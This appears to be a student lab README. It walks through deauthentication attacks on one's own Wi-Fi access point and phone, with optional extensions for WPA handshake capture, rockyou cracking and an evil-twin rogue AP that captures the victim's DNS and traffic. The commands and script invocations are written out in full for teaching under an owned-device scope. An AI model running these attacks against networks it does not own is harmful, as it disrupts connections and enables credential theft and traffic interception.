# What you need to do — deauth attack only

**Required deliverable:** demonstrate a deauthentication attack on your own
device. Everything else in this repo (handshake crack, evil twin, PMF
mitigation demo, airgeddon) is optional bonus material — skip it unless
you have time.

---

## Phase 0 — Hardware

- [ ] USB Wi-Fi adapter that supports monitor mode + packet injection.
      Easy default: Alfa AWUS036NHA (Atheros AR9271 chipset).

## Phase 1 — Pi bring-up

- [ ] Flash Kali Linux ARM (Pi 4 image) to an SD card.
      <https://www.kali.org/get-kali/#kali-arm>
- [ ] First boot: change the default `kali / kali` password.
- [ ] `sudo apt update && sudo apt full-upgrade -y`
- [ ] `sudo apt install -y kali-tools-wireless`
- [ ] Plug in the USB adapter.
- [ ] `git clone` this repo onto Pi #1.
- [ ] `sudo ./scripts/00-prereq-check.sh` — note the USB adapter's
      interface name (usually `wlan1`).
- [ ] Verify monitor mode + injection:
  ```
  sudo airmon-ng start wlan1
  sudo aireplay-ng --test wlan1mon
  ```
  Look for "Injection is working!". If not, the adapter's driver doesn't
  support injection and you need a different adapter.

## Phase 2 — Set up an AP you own to attack

Use whichever is easiest. You only need one.

- **Option A — Pi #2 as test AP** (cleanest, fully self-contained):
  - [ ] Copy `configs/hostapd-testap.conf` onto Pi #2.
  - [ ] `sudo apt install -y hostapd`
  - [ ] `sudo hostapd configs/hostapd-testap.conf`
- **Option B — a home router or travel router you own.**
- **Option C — your laptop's Wi-Fi hotspot.**

Then:
- [ ] On your phone: connect to that AP. (Internet doesn't have to work.)

## Phase 3 — Inventory (your legal scope evidence)

- [ ] Open `lab-notes/inventory.md`. Fill in **every** field.
- [ ] On your phone: turn **OFF** "private MAC" / "MAC randomization" for
      the test SSID, otherwise you'll be chasing a different MAC every
      reconnect.

## Phase 4 — Recon (find the target's details)

- [ ] `sudo ./scripts/01-monitor-up.sh wlan1`
- [ ] `sudo ./scripts/02-scan.sh wlan1mon`
- [ ] From the airodump output, write down:
  - Target AP **BSSID**
  - Target AP **channel**
  - Phone **MAC** (appears under STATION once associated)
- [ ] Sanity check: your test AP must be the strongest signal on its
      channel. If not, move physically closer — you don't want stray
      deauth frames hitting other APs.
- [ ] Ctrl-C to stop the scan.

## Phase 5 — The attack (this is the assignment)

- [ ] `sudo ./scripts/04-deauth-targeted.sh -a <BSSID> -c <PHONE_MAC> -i wlan1mon`
- [ ] Watch your phone — it should briefly disconnect.
- [ ] Capture evidence:
  - [ ] Screenshot / copy the `aireplay-ng` output
  - [ ] Screenshot or short video of the phone losing Wi-Fi
  - [ ] (Nice extra) capture a pcap of the attack:
        in another terminal, run
        `sudo airodump-ng -c <CH> --bssid <BSSID> -w deauth-evidence wlan1mon`
        before firing the deauth, then open `deauth-evidence-01.cap` in
        Wireshark and filter `wlan.fc.type_subtype == 0x0c`. Screenshot
        one deauth frame — this is what makes the writeup convincing.

That's the required deliverable.

## Phase 6 — Cleanup

- [ ] `sudo ./scripts/07-cleanup.sh`
- [ ] Re-enable MAC randomization on your phone.

## Phase 7 — Report

- [ ] Open `REPORT.md`. Fill in the `[TODO]` fields and **delete the
      sections you didn't do** (PMF mitigation, evil twin, airgeddon).

---

## Stuck?

Ask Claude. Useful things to paste:
- Output of `sudo ./scripts/00-prereq-check.sh`
- The airodump-ng screen when something looks wrong
- Any error from `aireplay-ng`
- Your phone's behaviour ("disconnects" / "doesn't disconnect" / "warning shows")

---

# Optional extensions

## Extension A — handshake capture + offline crack

Builds on the deauth: when the client reconnects, the WPA 4-way
handshake gets captured. Then crack offline with a wordlist.

Prep on the test AP: set `wpa_passphrase=password123` (or anything in
rockyou.txt) so the crack actually finishes. **Never reuse this
password.**

One-shot all-in-one (recommended):
```bash
sudo ./scripts/08-handshake-capture.sh \
    -a <BSSID> -c <CLIENT_MAC> -i wlan1mon -k 11 \
    -o handshake \
    -w /usr/share/wordlists/rockyou.txt
```
- Locks the channel
- Starts airodump-ng in the background
- Fires deauth, watches the pcap, retries once at 30s
- When the handshake lands, runs the offline crack against the wordlist
- Drop the `-w` flag if you just want the pcap and want to crack later

If rockyou is gzipped:
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

Evidence for the report:
- Screenshot of "Handshake captured" line
- Screenshot of `KEY FOUND! [ password123 ]`
- The `handshake-01.cap` file itself (mention the filename in the report)

## Extension B — evil twin

Needs the **second** USB Wi-Fi adapter (will appear as `wlan2`). One
adapter sniffs + deauths, the other broadcasts the rogue AP.

**Prereqs**
- PMF must be **off** on the real AP (`ieee80211w=0` in
  `configs/hostapd-testap.conf`). Otherwise the deauth fails.
- Reconnect your phone to the real AP after any PMF change.
- Monitor mode already up: `sudo ./scripts/01-monitor-up.sh wlan1`
- Confirm the second adapter shows up: `iw dev` should list both
  `wlan1mon` and `wlan2`.

**Recommended: one-command orchestrator**

`scripts/10-evil-twin-attack.sh` brings up the rogue AP, runs the
deauth loop, and captures rogue traffic in one terminal. Ctrl-C tears
everything down.

If your real AP is **WPA2** (most likely), mirror its password so your
phone auto-joins:
```bash
sudo ./scripts/10-evil-twin-attack.sh \
    -B <REAL_BSSID> -S "<REAL_SSID>" -C <PHONE_MAC> \
    -k 11 -m wlan1mon -a wlan2 \
    -W password123
```

If your real AP is open, drop `-W`:
```bash
sudo ./scripts/10-evil-twin-attack.sh \
    -B <REAL_BSSID> -S "<REAL_SSID>" -C <PHONE_MAC> \
    -k 11 -m wlan1mon -a wlan2
```

The script prints the workdir at startup (e.g. `/tmp/eviltwin.XXXX/`).
After Ctrl-C, the artefacts you need for the report are there:
- `hostapd.log` — proof the rogue AP came up on the right channel/SSID
- `dnsmasq.log` — DHCP lease to your phone's MAC + every DNS query the
  phone made through you
- `rogue.pcap` — open in Wireshark for traffic-level evidence

**Manual 3-terminal workflow** (if you want to see each piece working
separately, more pedagogically clear):

1. Edit `configs/hostapd-rogue.conf` — set `ssid=` to match your real
   AP's SSID exactly. Add a WPA2 block (commented at the bottom of the
   file) if you want to mirror the password.
2. Terminal A: `sudo ./scripts/06-evil-twin-up.sh`
3. Terminal B:
   `sudo ./scripts/09-deauth-loop.sh -a <REAL_BSSID> -c <PHONE_MAC> -i wlan1mon -k 11`
4. Terminal C:
   `sudo tcpdump -i wlan2 -n -s0 -w rogue.pcap`
5. Cleanup: `sudo ./scripts/07-cleanup.sh`

**Phone confirmation**

On the phone, check the connected SSID and whether the IP is
`10.0.0.x` — if so, you served the lease, i.e. the phone is on your
rogue. (Same SSID on both networks looks identical to the user; the IP
is the giveaway.)

**Why the phone might not roam**
- Real AP signal is still stronger — move closer to your Pi or further
  from the real AP.
- Rogue is open but real is WPA2 — phones won't auto-downgrade. Use
  `-W <real-password>` to mirror.
- Real AP has PMF enabled — deauth fails, victim stays put. Disable PMF
  on the test AP for this demo.
